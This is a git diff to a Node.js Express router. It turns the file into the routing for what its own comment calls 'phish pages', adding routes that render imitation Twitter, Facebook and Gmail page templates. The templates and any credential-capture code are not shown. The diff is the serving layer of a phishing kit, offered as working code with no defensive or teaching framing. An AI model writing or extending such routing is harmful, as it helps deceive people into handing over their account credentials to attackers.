@@ -1,9 +1,14 @@
 var express = require('express');
 var router = express.Router();
 
-/* GET users listing. */
+/* GET phish pages. */
 router.get('/', function(req, res, next) {
-  res.render('index-2')
+  res.render('twitter') // twitter
 });
-
+router.get('/facebook', function(req, res, next) {
+  res.render('facebook') // facebook
+});
+router.get('/gmail', function(req, res, next) {
+  res.render('gmail') // facebook
+});
 module.exports = router;
